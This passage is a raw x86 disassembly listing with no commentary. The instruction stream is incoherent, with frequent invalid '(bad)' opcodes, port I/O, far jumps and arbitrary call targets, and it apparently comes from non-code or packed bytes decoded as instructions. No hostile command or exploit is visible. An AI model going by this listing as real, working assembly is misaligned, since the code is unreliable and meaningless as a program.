  40af53:	jmp    FWORD PTR [edx-0x75736cce]
  40af59:	ss xchg edi,eax
  40af5b:	out    0xe7,eax
  40af5d:	sub    ah,BYTE PTR [edi]
  40af5f:	xor    BYTE PTR [ebx],al
  40af61:	shl    BYTE PTR [ebp+0x46],1
  40af64:	and    BYTE PTR [eax-0x6f6cd413],dl
  40af6a:	jnp    0x40af81
  40af6c:	ins    DWORD PTR es:[edi],dx
  40af6d:	dec    eax
  40af6e:	inc    ebp
  40af6f:	or     ch,BYTE PTR [edi-0x72d72255]
  40af75:	pusha  
  40af76:	jp     0x40af38
  40af78:	jle    0x40af98
  40af7a:	pop    edx
  40af7b:	in     al,dx
  40af7c:	popa   
  40af7d:	loope  0x40afa8
  40af7f:	js     0x40af54
  40af81:	jae    0x40af36
  40af83:	ds mov bl,0x59
  40af86:	loopne 0x40afa6
  40af88:	icebp  
  40af89:	aas    
  40af8a:	mov    esi,0x48caecd2
  40af8f:	sbb    eax,0xdaf46ff4
  40af94:	clc    
  40af95:	call   0x5467:0x575af9fa
  40af9c:	pop    ecx
  40af9d:	add    al,0x84
  40af9f:	iret   
  40afa0:	(bad)  
  40afa1:	fs cmc 
  40afa3:	add    ebp,DWORD PTR [edx+0x3baebfa7]
  40afa9:	inc    esi
  40afaa:	out    0xf4,eax
  40afac:	ficom  DWORD PTR [edx-0x78]
  40afaf:	iret   
  40afb0:	test   BYTE PTR ds:0xb6ce8d8d,dh
  40afb6:	scas   al,BYTE PTR es:[edi]
  40afb7:	imul   esp,DWORD PTR [edi+0x1d],0xcb97c879
  40afbe:	push   esi
  40afbf:	push   edi
  40afc0:	jg     0x40af6c
  40afc2:	popa   
  40afc3:	xchg   esp,eax
  40afc5:	jle    0x40af51
  40afc7:	xchg   ebx,eax
  40afc8:	call   0x7f4de633
  40afcd:	xlat   BYTE PTR ds:[ebx]
  40afce:	mov    ebx,0xdb2290d1
  40afd3:	ds xchg esp,eax
  40afd5:	add    bh,BYTE PTR [ebp-0x7328d2b9]
  40afdb:	cwde   
  40afdc:	js     0x40b043
  40afde:	scas   eax,DWORD PTR es:[edi]
  40afdf:	sbb    eax,0x75ed3019
  40afe4:	xchg   ebp,eax
  40afe5:	into   
  40afe6:	rcr    DWORD PTR [ecx+0x2be44935],cl
  40afec:	xchg   edi,eax
  40afed:	push   edi
  40afee:	bt     DWORD PTR [eax+0x22c8a15c],esi
  40aff5:	mov    gs,WORD PTR [edx+ebp*4-0x56]
  40aff9:	push   ebx
  40affa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40affb:	lahf   
  40affc:	js     0x40b00b
  40affe:	out    dx,al
  40afff:	mov    ?,WORD PTR [edx+0x49]
  40b002:	lds    ebp,FWORD PTR [esp+ebp*4-0x4c]
  40b006:	xchg   edx,eax
  40b007:	xor    esi,esp
  40b009:	sbb    ch,bl
  40b00b:	inc    edi
  40b00c:	mov    al,ds:0x94be7f2b
  40b011:	pop    eax
  40b012:	inc    esp
  40b013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b014:	icebp  
  40b015:	inc    eax
  40b016:	dec    ebp
  40b017:	jle    0x40afd9
  40b019:	test   al,0xd3
  40b01b:	ror    edx,cl
  40b01d:	adc    eax,0xbf5dec00
  40b022:	dec    ebp
  40b023:	mov    al,0x5e
  40b025:	iret   
  40b026:	mov    ecx,0xa81ae1f8
  40b02b:	js     0x40b077
  40b02d:	pop    ds
  40b02e:	mov    DWORD PTR [ecx],eax
  40b030:	lds    eax,FWORD PTR [ebx+0x54]
  40b033:	or     BYTE PTR [edx+0x36],0x41
  40b037:	data16 fist WORD PTR [edx]
  40b03a:	pop    ds
  40b03b:	outs   dx,BYTE PTR ds:[esi]
  40b03c:	cmp    BYTE PTR [esi+0x73e61c61],0x2b
  40b043:	mov    eax,0x51181e42
  40b048:	or     eax,0xd910b704
  40b04d:	xchg   edi,eax
  40b04e:	fwait
  40b04f:	mov    cl,0xf1
  40b051:	or     ebp,DWORD PTR [ebp+0x29b948f9]
  40b057:	cmp    bh,BYTE PTR ds:0x5755849
  40b05d:	mov    ebx,0x9c509221
  40b062:	inc    ebp
  40b063:	std    
  40b064:	mov    cl,0x55
  40b066:	add    ecx,ebp
  40b068:	xor    bh,cl
  40b06a:	push   edi
  40b06b:	jmp    0x85eb:0x4c3201b1
  40b072:	outs   dx,DWORD PTR ds:[esi]
  40b073:	imul   edx,DWORD PTR [edi-0x34],0xffffffeb
  40b077:	cmp    esi,DWORD PTR [edi+ebx*2-0x588c9b43]
  40b07e:	call   0xabe3d2d3
  40b083:	or     BYTE PTR [esi],bh
  40b085:	lea    edi,[ebp-0x3e7aa60e]
  40b08b:	mov    esp,0x38aba8a5
  40b090:	or     ebp,esp
  40b092:	inc    esi
  40b093:	inc    ebx
  40b094:	jmp    0x40b0f4
  40b096:	pop    esi
  40b097:	jle    0x40b0c8
  40b099:	add    BYTE PTR [edx+0x2f],0x7c
  40b09d:	mov    ds:0x729c7373,al
  40b0a2:	inc    ebx
  40b0a3:	ret    
  40b0a4:	nop
  40b0a5:	bound  si,DWORD PTR [edx+0x66cd0c62]
  40b0ac:	or     esp,DWORD PTR [edx-0x7fc7f50c]
  40b0b2:	(bad)  
  40b0b3:	repz inc edi
  40b0b5:	add    ecx,ecx
  40b0b7:	int    0xfc
  40b0b9:	xor    BYTE PTR [ebp+0x1eb20af7],dl
  40b0bf:	mov    WORD PTR [ebp-0x2cdc9c99],ds
  40b0c5:	and    bh,BYTE PTR [edi]
  40b0c7:	fwait
  40b0c8:	xchg   esi,eax
  40b0c9:	loope  0x40b0d4
  40b0cb:	dec    ebx
  40b0cc:	adc    DWORD PTR [eax-0x6d],0xffffffcb
  40b0d0:	pop    es
  40b0d1:	xchg   ebx,eax
  40b0d2:	retf   0xe7d3
  40b0d5:	fdivr  DWORD PTR [edi]
  40b0d7:	fst    DWORD PTR [ecx]
  40b0d9:	xor    DWORD PTR [edi],0xfffffffc
  40b0dc:	aas    
  40b0dd:	xor    ecx,DWORD PTR [esp+ebp*2+0x38]
  40b0e1:	add    al,BYTE PTR [esi]
  40b0e3:	jb     0x40b15a
  40b0e5:	outs   dx,BYTE PTR ds:[esi]
  40b0e6:	cmp    al,0x9f
  40b0e8:	pop    ebp
  40b0e9:	scas   eax,DWORD PTR es:[edi]
  40b0ea:	ds scas eax,DWORD PTR es:[edi]
  40b0ec:	jb     0x40b09f
  40b0ee:	repnz mov dh,0xb8
  40b0f1:	jmp    0x40b0c6
  40b0f3:	sbb    DWORD PTR [eax-0x7f],ecx
  40b0f6:	call   0x2dd55405
  40b0fb:	(bad)  
  40b0fc:	mov    ch,0x44
  40b0fe:	sbb    eax,0x90922593
  40b103:	fld    DWORD PTR ds:0x1083f133
  40b109:	sbb    al,0xd5
  40b10b:	and    eax,0x7da110bd
  40b110:	aas    
  40b111:	lods   al,BYTE PTR ds:[esi]
  40b112:	add    DWORD PTR [eax-0x724b7c37],esi
  40b118:	inc    esp
  40b119:	cli    
  40b11a:	ins    DWORD PTR es:[edi],dx
  40b11b:	lea    esp,[ecx]
  40b11d:	mov    ch,0x82
  40b11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b120:	imul   edx,DWORD PTR [esi],0xb781a35
  40b126:	test   BYTE PTR [edx-0x29],bl
  40b129:	or     eax,0x9c5a8880
  40b12e:	cli    
  40b12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b130:	pop    esp
  40b131:	in     eax,0xc3
  40b133:	cmc    
  40b134:	out    dx,al
  40b135:	aas    
  40b136:	iret   
  40b137:	and    BYTE PTR [edx-0x73bc1499],0x13
  40b13e:	inc    edx
  40b13f:	std    
  40b140:	pushf  
  40b141:	pop    edi
  40b142:	int3   
  40b143:	daa    
  40b144:	inc    edx
  40b145:	push   eax
  40b146:	push   esi
  40b147:	(bad)  
  40b148:	inc    edi
  40b149:	mov    edx,0x935756f5
  40b14e:	mov    ch,0x34
  40b150:	or     cl,0x3
  40b153:	jns    0x40b1af
  40b155:	cs retf 0x33ee
  40b159:	popf   
  40b15a:	cmc    
  40b15b:	in     al,dx
  40b15c:	in     eax,0xda
  40b15e:	int    0xc4
  40b160:	mov    dl,0x7a
  40b162:	push   eax
  40b163:	aam    0x5a
  40b165:	add    edx,DWORD PTR [ebx+0x7244c9dd]
  40b16b:	add    ebp,DWORD PTR [ecx+0x10]
  40b16e:	test   ebx,ebx
  40b170:	loopne 0x40b186
  40b172:	mov    ch,0xc1
  40b174:	je     0x40b1ae
  40b176:	inc    ecx
  40b177:	(bad)  [edx]
  40b179:	pshufw mm7,mm5,0xfd
  40b17d:	push   cs
  40b17e:	jle    0x40b143
  40b180:	in     al,dx
  40b181:	pop    esi
  40b182:	xchg   esp,eax
  40b183:	test   BYTE PTR [edx+0x1220a8be],al
  40b189:	lock nop
  40b18b:	aad    0x7f
  40b18d:	mov    eax,0x3a7fcdec
  40b192:	sti    
  40b193:	scas   eax,DWORD PTR es:[edi]
  40b194:	retf   0x2a5a
  40b197:	adc    BYTE PTR ds:0x569677b3,bh
  40b19d:	pop    ecx
  40b19e:	jp     0x40b1fb
  40b1a0:	or     edx,DWORD PTR [eax-0x4d]
  40b1a3:	or     DWORD PTR [ecx+0x3c73178e],esi
  40b1a9:	test   dh,al
  40b1ab:	sbb    ecx,DWORD PTR [eax+eax*8+0x6c]
  40b1af:	imul   ebp,DWORD PTR [edx+ebx*1-0x141e739f],0x6a2cd443
  40b1ba:	neg    BYTE PTR [ebx]
  40b1bc:	sbb    ebp,DWORD PTR [ebp-0x2f]
  40b1bf:	and    eax,DWORD PTR [ebx]
  40b1c1:	pusha  
  40b1c2:	(bad)
  40b1c5:	cwde   
  40b1c6:	dec    esi
  40b1c7:	xor    al,BYTE PTR [ebp+0x4479091b]
  40b1cd:	sub    DWORD PTR [eax],0xa
  40b1d0:	pop    edi
  40b1d1:	pushf  
  40b1d2:	in     al,0x91
  40b1d4:	stos   DWORD PTR es:[edi],eax
  40b1d5:	stos   DWORD PTR es:[edi],eax
  40b1d6:	xchg   ebp,eax
  40b1d7:	sar    DWORD PTR [edi+0x45],cl
  40b1da:	jns    0x40b251
  40b1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1dd:	int    0x56
  40b1df:	cmp    dl,BYTE PTR [edx]
  40b1e1:	js     0x40b1c0
  40b1e3:	mov    esi,0xb6a026ca
  40b1e8:	lea    esi,[esi-0x60]
  40b1eb:	mov    eax,0x9637ee3a
  40b1f0:	xchg   DWORD PTR [ebp-0x13],eax
  40b1f3:	jmp    0xccd5:0x41057f59
  40b1fa:	inc    ecx
  40b1fb:	mov    ah,BYTE PTR [ecx]
  40b1fd:	sahf   
  40b1fe:	ror    DWORD PTR [ebx],cl
  40b200:	sub    BYTE PTR [ecx+eiz*2+0xa068e85],ah
  40b207:	dec    ebx
  40b208:	mov    esi,0x5c3ba581
  40b20d:	int    0x7d
  40b20f:	dec    esi
  40b210:	adc    bl,BYTE PTR [edi+esi*4+0x2fc0ed9b]
  40b217:	fnstenv es:[esi]
  40b21a:	add    BYTE PTR [ebx-0x6471eaf5],ah
  40b220:	ins    DWORD PTR es:[edi],dx
  40b221:	jno    0x40b237
  40b223:	out    dx,eax
  40b224:	adc    eax,0x4f2d189b
  40b229:	pusha  
  40b22a:	mov    ecx,0xd0f7bda7
  40b22f:	push   esp
  40b230:	jbe    0x40b246
  40b232:	dec    edi
  40b233:	mul    ah
  40b235:	adc    eax,0x4e128071
  40b23a:	jmp    0xa44a:0x322ad56f
  40b241:	es mov cl,cl
  40b244:	adc    DWORD PTR ds:0x5c71f808,ecx
  40b24a:	dec    ebx
  40b24b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b24d:	sub    ebp,edi
  40b24f:	pop    ebp
  40b250:	je     0x40b263
  40b252:	push   DWORD PTR [edx+0x7b71cf88]
  40b258:	adc    edi,DWORD PTR [esi+ebp*2]
  40b25b:	mov    al,0x50
  40b25d:	xchg   esi,eax
  40b25e:	dec    ecx
  40b25f:	mov    eax,ds:0xb48caa47
  40b264:	lahf   
  40b265:	ret    
  40b266:	sbb    eax,0xfa32ec16
  40b26b:	data16 mov al,gs:0xba4c4ad7
  40b272:	cmp    dh,BYTE PTR [ecx+0x4c216e5c]
  40b278:	in     al,0xa2
  40b27a:	pusha  
  40b27b:	les    esi,FWORD PTR [edi+ebx*2+0x44]
  40b27f:	mov    ebp,0x7dab449c
  40b284:	inc    ebp
  40b285:	mov    dh,0xb4
  40b287:	adc    ebp,edx
  40b289:	pop    esp
  40b28a:	and    ebx,ecx
  40b28c:	xchg   ecx,eax
  40b28d:	cmp    DWORD PTR [esp+edi*1-0x660a0266],esp
  40b294:	adc    ebp,ebp
  40b296:	mov    esi,0x10eac8be
  40b29b:	jo     0x40b2d0
  40b29d:	jno    0x40b289
  40b29f:	rcr    BYTE PTR [edi-0x4c],0x9b
  40b2a3:	lea    ebp,[ebp-0x15]
  40b2a6:	popa   
  40b2a7:	out    0xb0,al
  40b2a9:	sub    ecx,DWORD PTR [eax-0x65942078]
  40b2af:	aaa    
  40b2b0:	mov    ebx,0xd9b0feb6
  40b2b5:	popa   
  40b2b6:	mov    ah,0xd1
  40b2b8:	xor    ebx,0xffffffaf
  40b2bb:	ret    
  40b2bc:	mov    ebx,0x971d2014
  40b2c1:	ret    
  40b2c2:	or     edx,DWORD PTR [ebx+eax*4+0x4c7bcdef]
  40b2c9:	xchg   bl,ah
  40b2cb:	mov    BYTE PTR [ecx-0x7b],dh
  40b2ce:	or     eax,0xf53c9f36
  40b2d3:	xchg   BYTE PTR [ecx],dl
  40b2d5:	je     0x40b282
  40b2d7:	outs   dx,WORD PTR ds:[esi]
  40b2d9:	je     0x40b2e3
  40b2db:	adc    eax,0x894f396a
  40b2e0:	sub    ecx,ebx
  40b2e2:	xor    al,0xe5
  40b2e4:	into   
  40b2e5:	shl    DWORD PTR [edi-0x632e1954],cl
  40b2eb:	push   edx
  40b2ec:	out    0x8e,eax
  40b2ee:	imul   edx,DWORD PTR [edi-0x2c],0x39
  40b2f2:	inc    ebx
  40b2f3:	mov    bl,0xca
  40b2f5:	xor    eax,0x80c34f70
  40b2fa:	add    al,0xba
  40b2fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2fd:	mov    dh,0x4b
  40b2ff:	inc    esi
  40b300:	push   cs
  40b301:	cld    
  40b302:	adc    al,0xc6
  40b304:	fst    DWORD PTR [esp+eax*8-0x3ae41350]
  40b30b:	xor    ecx,DWORD PTR [esi-0x26ca91cf]
  40b311:	xchg   ebx,eax
  40b312:	out    0xd1,eax
  40b314:	nop
  40b315:	outs   dx,DWORD PTR ds:[esi]
  40b316:	jne    0x40b2ea
  40b318:	adc    eax,0x17731158
  40b31d:	(bad)  
  40b31e:	out    0xd9,eax
  40b320:	inc    esi
  40b321:	imul   esp,DWORD PTR [ecx+0x735853b4],0x8a27d9fe
  40b32b:	stc    
  40b32c:	shl    DWORD PTR [edi],0x67
  40b32f:	jnp    0x40b3a1
  40b331:	mov    dh,BYTE PTR [ebp+0x6af5fa74]
  40b337:	mov    edi,0x46d004b
  40b33c:	or     al,0xb7
  40b33e:	popa   
  40b33f:	cmp    al,0xc3
  40b341:	add    ah,dl
  40b343:	pusha  
  40b344:	jnp    0x40b3bf
  40b346:	sub    BYTE PTR [edi-0x60f102aa],dh
  40b34c:	inc    ebx
  40b34d:	shl    BYTE PTR [edi],0xa1
  40b350:	(bad)  
  40b351:	mov    ecx,0xfdd7dffa
  40b356:	dec    ebx
  40b357:	push   esi
  40b358:	mov    esp,0xd7880c8c
  40b35d:	shl    BYTE PTR [esi+0x6a],cl
  40b360:	jno    0x40b348
  40b362:	inc    edi
  40b363:	dec    eax
  40b364:	add    ch,bh
  40b366:	test   al,0xb3
  40b368:	rcr    DWORD PTR [edi+0x53],1
  40b36b:	mov    al,ds:0xf81109dc
  40b370:	or     dl,BYTE PTR [ebp-0x55]
  40b373:	push   cs
  40b374:	ror    DWORD PTR [edi+0x5e228ec1],cl
  40b37a:	test   bl,bl
  40b37c:	in     eax,dx
  40b37d:	inc    esp
  40b37e:	sbb    al,0x16
  40b380:	xor    ch,bl
  40b382:	(bad)  
  40b384:	push   ebp
  40b385:	jae    0x40b389
  40b387:	lods   al,BYTE PTR ds:[esi]
  40b388:	push   0x746fff3e
  40b38d:	push   ebx
  40b38e:	pop    esi
  40b38f:	mov    eax,0xe71efcb
  40b394:	inc    esi
  40b395:	js     0x40b363
  40b397:	xlat   BYTE PTR fs:[ebx]
  40b399:	(bad)  
  40b39a:	and    BYTE PTR ds:0x274f31e2,0xa
  40b3a1:	(bad)  
  40b3a2:	loopne 0x40b3a8
  40b3a4:	in     al,0x65
  40b3a6:	ror    DWORD PTR [edx-0x7e],cl
  40b3a9:	out    dx,al
  40b3aa:	jno    0x40b374
  40b3ac:	and    ebx,DWORD PTR [eax-0x71]
  40b3af:	cmp    al,BYTE PTR [edx]
  40b3b1:	push   eax
  40b3b2:	int    0xb
  40b3b4:	retf   
  40b3b5:	repnz sar BYTE PTR [ebx],cl
  40b3b8:	iret   
  40b3b9:	mov    WORD PTR [edi+0x3814ac7d],cs
  40b3bf:	pusha  
  40b3c0:	idiv   DWORD PTR [esi+0x5e]
  40b3c3:	pop    edi
  40b3c4:	xor    DWORD PTR [eax+0x7a15c3f8],ebp
  40b3ca:	arpl   WORD PTR [eax+0x6e],sp
  40b3cd:	add    eax,0x69d31130
  40b3d2:	adc    esp,DWORD PTR [eax-0xf845f6e]
  40b3d8:	add    al,0xa7
  40b3da:	fwait
  40b3db:	outs   dx,DWORD PTR ds:[esi]
  40b3dc:	fxch   st(2)
  40b3de:	pushf  
  40b3df:	test   al,0x5b
  40b3e1:	push   ebp
  40b3e2:	sbb    ebp,ebx
  40b3e4:	adc    eax,0x808ca08
  40b3e9:	mov    ebp,0x37591a3f
  40b3ee:	pusha  
  40b3ef:	ja     0x40b3a3
  40b3f1:	cs dec cl
  40b3f4:	(bad)  
  40b3f6:	pusha  
  40b3f7:	jns    0x40b46f
  40b3f9:	mov    ebx,0x64e9e745
  40b3fe:	sar    BYTE PTR [ebx+0x68b4c9e8],cl
  40b404:	mov    ds:0x7edfd7a9,eax
  40b409:	mov    esi,0xcec4f7d5
  40b40e:	pop    esi
  40b40f:	outs   dx,BYTE PTR ds:[esi]
  40b410:	aam    0xf6
  40b412:	adc    eax,0x7507cda4
  40b417:	shr    BYTE PTR [ebx-0x2c],1
  40b41a:	in     al,dx
  40b41b:	sub    eax,0x48282410
  40b420:	push   ss
  40b421:	mov    cl,0x51
  40b423:	push   es
  40b424:	ret    0xd58f
  40b427:	adc    al,0xed
  40b429:	ror    BYTE PTR [edx-0x22ef20cc],0x69
  40b430:	jle    0x40b40a
  40b432:	and    dh,0x2c
  40b435:	mov    eax,ds:0xc44a9cf8
  40b43a:	mov    ds:0xa546f2c4,al
  40b43f:	push   edx
  40b440:	push   ecx
  40b441:	int    0x33
  40b443:	fidiv  DWORD PTR [ebp-0x6a]
  40b446:	mov    DWORD PTR [ebx+0x2c],eax
  40b449:	pop    ss
  40b44a:	inc    BYTE PTR [ebx-0x62]
  40b44d:	icebp  
  40b44e:	jae    0x40b3db
  40b450:	xchg   esi,eax
  40b451:	mov    ebp,0x152d0ee5
  40b456:	enterw 0x7cf3,0x88
  40b45b:	jecxz  0x40b465
  40b45d:	inc    edi
  40b45e:	sbb    al,al
  40b460:	jbe    0x40b4dc
  40b462:	fs enter 0x84bf,0xd
  40b467:	sbb    eax,0xf4d4f141
  40b46c:	nop
  40b46d:	and    edi,eax
  40b46f:	(bad)  
  40b470:	fdiv   st(4),st
  40b472:	xchg   esi,eax
  40b473:	call   0x1559082b
  40b478:	call   0x8ef3:0x186a7d57
  40b47f:	sbb    dl,BYTE PTR [edi]
  40b481:	mov    esp,0xf70bab95
  40b486:	popf   
  40b487:	mov    edx,0x8342fa00
  40b48c:	sub    bl,al
  40b48e:	jb     0x40b50f
  40b490:	mov    ebp,0x991adfba
  40b495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b496:	or     al,0xe3
  40b498:	or     ah,dh
  40b49a:	or     eax,0xb44ffe1
  40b49f:	sbb    bh,BYTE PTR [ebx+0x5305564e]
  40b4a5:	fs pusha 
  40b4a7:	aam    0xb
  40b4a9:	mov    ds:0xa85871d3,al
  40b4ae:	mov    al,0x3e
  40b4b0:	mov    edi,0x9b52fa30
  40b4b5:	or     esi,DWORD PTR [eax-0x3239b04]
  40b4bb:	outs   dx,BYTE PTR ds:[esi]
  40b4bc:	shl    BYTE PTR [esi],0xd6
  40b4bf:	sbb    eax,0x821aec04
  40b4c4:	fdivr  DWORD PTR [edx+0x8655b4b]
  40b4ca:	push   eax
  40b4cb:	push   eax
  40b4cc:	out    0x2e,al
  40b4ce:	call   0xeae9:0x37cc1f25
  40b4d5:	in     eax,dx
  40b4d6:	dec    esi
  40b4d7:	inc    esi
  40b4d8:	into   
  40b4d9:	into   
  40b4da:	test   DWORD PTR [ecx-0x77],0x774c959c
  40b4e1:	or     ebx,DWORD PTR [ebx]
  40b4e3:	int    0x21
  40b4e5:	sbb    eax,0x7d1408bb
  40b4ea:	(bad)  
  40b4eb:	stc    
  40b4ec:	out    0xce,eax
  40b4ee:	(bad)  [eax+0x6f6ba7eb]
  40b4f4:	sub    DWORD PTR [ebx-0x2cc6b7b7],eax
  40b4fa:	or     dh,BYTE PTR [ebx-0x4d772dec]
  40b500:	cwde   
  40b501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b502:	ja     0x40b541
  40b504:	mov    ah,0x81
  40b506:	(bad)  
  40b507:	ins    BYTE PTR es:[edi],dx
  40b508:	es inc edi
  40b50a:	daa    
  40b50b:	repz div ecx
  40b50e:	pop    eax
  40b50f:	cs out 0x52,eax
  40b512:	bound  ecx,QWORD PTR [ecx]
  40b514:	xchg   esi,eax
  40b515:	cmp    DWORD PTR [ecx+eax*4+0x79afadf0],0xffffffc0
  40b51d:	(bad)  
  40b51f:	cmp    al,0x22
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	mov    ebx,DWORD PTR [edi]
  40b524:	icebp  
  40b525:	shl    DWORD PTR [edi+0x4e],cl
  40b528:	and    DWORD PTR [edx],esi
  40b52a:	(bad)  
  40b52c:	leave  
  40b52d:	or     bh,BYTE PTR [ecx+0x1f]
  40b530:	fisttp QWORD PTR [ebx+0x36145f75]
  40b536:	push   edx
  40b537:	leave  
  40b538:	jp     0x40b4e0
  40b53a:	pop    ss
  40b53b:	cmp    BYTE PTR [ebx-0x8c01e01],ah
  40b541:	in     eax,dx
  40b542:	mov    esi,0x539b062c
  40b547:	inc    ecx
  40b548:	pop    ebx
  40b549:	mov    bl,0x3a
  40b54b:	add    bl,0xd6
  40b54e:	push   es
  40b54f:	out    dx,al
  40b550:	sahf   
  40b551:	outs   dx,DWORD PTR ds:[esi]
  40b552:	mov    cl,0x13
  40b554:	xor    al,0x85
  40b556:	pushf  
  40b557:	lds    eax,FWORD PTR [edx-0x80]
  40b55a:	sub    eax,0x15bc9c6a
  40b55f:	rcr    BYTE PTR [esi],1
  40b561:	imul   eax,esp,0xe82f0142
  40b567:	test   DWORD PTR [esi+0x1708c0df],eax
  40b56d:	push   ebx
  40b56e:	sar    ecx,cl
  40b570:	out    dx,al
  40b571:	in     al,dx
  40b572:	sti    
  40b573:	cmp    al,0xb
  40b575:	dec    eax
  40b576:	je     0x40b537
  40b578:	arpl   WORD PTR [edi-0x2516731d],di
  40b57e:	pop    eax
  40b57f:	inc    ebx
  40b580:	mov    BYTE PTR [edi],al
  40b582:	inc    ebx
  40b583:	sar    DWORD PTR [edx-0x1cb7dbd8],0xc7
  40b58a:	dec    ebx
  40b58b:	pop    ecx
  40b58c:	xchg   esp,eax
  40b58d:	xchg   esi,eax
  40b58e:	test   dl,dl
  40b590:	mov    al,0x6
  40b592:	mov    eax,ds:0xad7be3b5
  40b597:	adc    esi,edx
  40b599:	fistp  WORD PTR [ebx-0x65]
  40b59c:	mov    esi,0xf3928efc
  40b5a1:	push   edi
  40b5a2:	(bad)  
  40b5a3:	(bad)  [eax+0x39500638]
  40b5a9:	imul   esi,DWORD PTR ds:0x5bb59b53,0x44334133
  40b5b3:	sbb    DWORD PTR [ebx],ecx
  40b5b5:	es int 0x5c
  40b5b8:	jnp    0x40b62c
  40b5ba:	fisttp WORD PTR [eax]
  40b5bc:	imul   edx,DWORD PTR [esi],0xffffffb6
  40b5bf:	sahf   
  40b5c0:	mov    al,ds:0x188e2275
  40b5c5:	cdq    
  40b5c6:	push   0x27fb4437
  40b5cb:	repz enter 0x12da,0xb9
  40b5d0:	sub    bh,BYTE PTR ds:0x23750eaa
  40b5d6:	ds aas 
  40b5d8:	call   0xbb69a496
  40b5dd:	lods   al,BYTE PTR ds:[esi]
  40b5de:	in     al,dx
  40b5df:	ror    DWORD PTR [eax-0x347a3c50],0x22
  40b5e6:	cli    
  40b5e7:	sar    DWORD PTR [ebx],cl
  40b5e9:	retf   0xa152
  40b5ec:	and    bl,dl
  40b5ee:	xor    BYTE PTR [esi+0x50],ah
  40b5f1:	add    eax,ecx
  40b5f3:	mov    bh,0x3c
  40b5f5:	or     al,0x5d
  40b5f7:	dec    eax
  40b5f9:	push   esi
  40b5fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5fb:	push   ss
  40b5fc:	dec    ebp
  40b5fd:	out    0xc,al
  40b5ff:	and    DWORD PTR [edx-0x700b16f1],0x46
  40b606:	sbb    DWORD PTR [esi],ebx
  40b608:	inc    ecx
  40b609:	test   eax,0x4c8f9b98
  40b60e:	xchg   edx,eax
  40b60f:	or     al,0x24
  40b611:	and    dh,BYTE PTR [edx]
  40b613:	or     al,0x6b
  40b615:	retf   0x8e6f
  40b618:	scas   al,BYTE PTR es:[edi]
  40b619:	xor    BYTE PTR ds:0x4b7988b5,cl
  40b61f:	mov    ah,0x3d
  40b621:	pop    ecx
  40b622:	pop    ebx
  40b623:	in     al,dx
  40b624:	jae    0x40b628
  40b626:	mov    eax,ds:0x37832453
  40b62b:	sti    
  40b62c:	lods   al,BYTE PTR ds:[esi]
  40b62d:	and    al,0xb2
  40b62f:	mov    bl,0xe4
  40b631:	mov    esp,fs
  40b633:	add    DWORD PTR [eax],ebp
  40b635:	ds cdq 
  40b637:	loope  0x40b678
  40b639:	mov    ebx,0x4a12adc4
  40b63e:	and    DWORD PTR [ecx-0x4b1fd353],0xffffffce
  40b645:	cmp    ch,0x8d
  40b648:	inc    ecx
  40b649:	or     bh,0x5f
  40b64c:	xor    al,0xf8
  40b64e:	stos   DWORD PTR es:[edi],eax
  40b64f:	ss add cl,bh
  40b652:	iret   
  40b653:	cdq    
  40b654:	push   ss
  40b655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b656:	cmp    dl,dl
  40b658:	jnp    0x40b5e7
  40b65a:	mov    esi,0xedd621b
  40b65f:	cmp    al,BYTE PTR [ecx+0x1a3c9d45]
  40b665:	loopne 0x40b664
  40b667:	inc    edi
  40b668:	cmp    BYTE PTR [eax],cl
  40b66a:	pop    ss
  40b66b:	pop    edx
  40b66c:	pop    ds
  40b66d:	iret   
  40b66e:	jl     0x40b6d1
  40b670:	sbb    DWORD PTR [eax],esi
  40b672:	mov    dh,0xa1
  40b674:	adc    BYTE PTR [esi],dl
  40b676:	out    dx,al
  40b677:	cmp    dl,BYTE PTR [ebp-0x3b]
  40b67a:	pop    ebp
  40b67b:	xor    BYTE PTR [ecx],dh
  40b67d:	int3   
  40b67e:	data16 xor BYTE PTR [edi-0x65],cl
  40b682:	(bad)  
  40b683:	les    ebx,FWORD PTR [esi-0x76dd9980]
  40b689:	imul   DWORD PTR [eax+0x500817c9]
  40b68f:	cmp    eax,0xe99bf3bb
  40b694:	je     0x40b70f
  40b696:	jno    0x40b6da
  40b698:	loope  0x40b61f
  40b69a:	call   0xb5a4b025
  40b69f:	test   DWORD PTR [edx-0x522b0c1d],ebp
  40b6a5:	sub    bh,BYTE PTR [edi+0x22bf37fd]
  40b6ab:	gs mov esp,0x9fa40942
  40b6b1:	cmp    edx,ebx
  40b6b3:	xchg   ecx,eax
  40b6b4:	push   eax
  40b6b5:	aad    0xc6
  40b6b7:	inc    edi
  40b6b8:	imul   edx,DWORD PTR [edi+0x1d4bf2bd],0xeafc0878
  40b6c2:	push   ds
  40b6c3:	jbe    0x40b68f
  40b6c5:	jno    0x40b6b5
  40b6c7:	adc    edx,edi
  40b6c9:	push   edx
  40b6ca:	sub    eax,0x463221f3
  40b6cf:	inc    edi
  40b6d0:	mov    esi,0xbb61e03b
  40b6d5:	mov    dh,0xe
  40b6d7:	xchg   ebx,eax
  40b6d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6d9:	out    dx,eax
  40b6da:	mov    ah,0xa1
  40b6dc:	jb     0x40b6bc
  40b6de:	add    ebx,DWORD PTR [edx]
  40b6e0:	lds    ecx,FWORD PTR [ebx-0x49]
  40b6e3:	mov    BYTE PTR es:[edi],dl
  40b6e6:	mov    al,ds:0x9d7a57f
  40b6eb:	outs   dx,DWORD PTR ds:[esi]
  40b6ec:	adc    BYTE PTR ds:0x3ff567ab,ah
  40b6f2:	xor    BYTE PTR [edx+0x6d3ff602],bl
  40b6f8:	fsub   st(4),st
  40b6fa:	mov    eax,ds:0xfd3d3970
  40b6ff:	jmp    0x27d37810
  40b704:	mov    WORD PTR [ebx-0x2b],?
  40b707:	pushf  
  40b708:	push   cs
  40b709:	push   0x3f963079
  40b70e:	fld    TBYTE PTR [ebx]
